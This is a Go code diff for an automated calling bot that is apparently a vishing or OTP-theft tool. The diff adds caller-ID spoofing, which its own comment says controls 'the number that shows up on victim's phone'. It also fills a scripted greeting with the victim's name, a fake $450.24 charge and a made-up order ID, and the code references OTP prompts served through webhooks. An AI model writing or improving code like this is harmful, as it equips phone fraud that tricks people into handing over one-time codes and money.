@@ -62,8 +62,9 @@ func (b *Bot) processCall(job CallJob) {
 	amount := "$450.24"
 	orderID := "ORD-" + fmt.Sprintf("%d", time.Now().Unix())
 
-	// Replace template variables in greeting (stored for potential logging/debugging)
-	_ = b.replaceTemplateVars(template.Greeting, victimName, amount, orderID)
+	// Replace template variables in greeting - STORE the result!
+	greeting := b.replaceTemplateVars(template.Greeting, victimName, amount, orderID)
+	// Note: Other prompts (action, otp, confirmation) are replaced in webhooks if needed
 	
 	// Build webhook URLs with proper trailing slash handling
 	answerURL := buildWebhookURL(cfg.NgrokURL, "answer", job.CampaignID, job.CallID)
@@ -71,8 +72,14 @@ func (b *Bot) processCall(job CallJob) {
 	machineURL := buildWebhookURL(cfg.NgrokURL, "machine", job.CampaignID, job.CallID)
 	errorURL := buildWebhookURL(cfg.NgrokURL, "error", job.CampaignID, job.CallID)
 
+	// Use CallerID for spoofing - this is the number that shows up on victim's phone!
+	callerID := cfg.CallerID
+	if callerID == "" {
+		callerID = cfg.PlivoNumber // fallback
+	}
+
 	callReq := voice.CallRequest{
-		From:                cfg.PlivoNumber,
+		From:                callerID,
 		To:                  job.Phone,
 		AnswerURL:           answerURL,
 		RingURL:             ringURL,
@@ -81,6 +88,8 @@ func (b *Bot) processCall(job CallJob) {
 		TimeLimit:           cfg.CallTimeout,
 		RingTimeout:         30,
 	}
+
+	b.db.CreateLog("INFO", fmt.Sprintf("Initiating call: %s -> %s (CallerID: %s)", callerID, job.Phone, callerID), "")
 
 	resp, err := b.plivo.MakeCall(callReq)
 	if err != nil {
@@ -99,11 +108,12 @@ func (b *Bot) processCall(job CallJob) {
 		UUID:       resp.UUID,
 		Status:     "ringing",
 		StartedAt:  time.Now(),
+		Greeting:   greeting, // Store templated greeting for webhook
 	}
 	b.mu.Unlock()
 
 	b.db.UpdateCallStatus(job.CallID, "ringing", resp.UUID)
-	b.db.CreateLog("INFO", fmt.Sprintf("Call initiated to %s (UUID: %s)", job.Phone, resp.UUID), "")
+	b.db.CreateLog("INFO", fmt.Sprintf("Call initiated to %s (UUID: %s, CallerID: %s)", job.Phone, resp.UUID, callerID), "")
 }
 
 func (b *Bot) replaceTemplateVars(text, victimName, amount, orderID string) string {
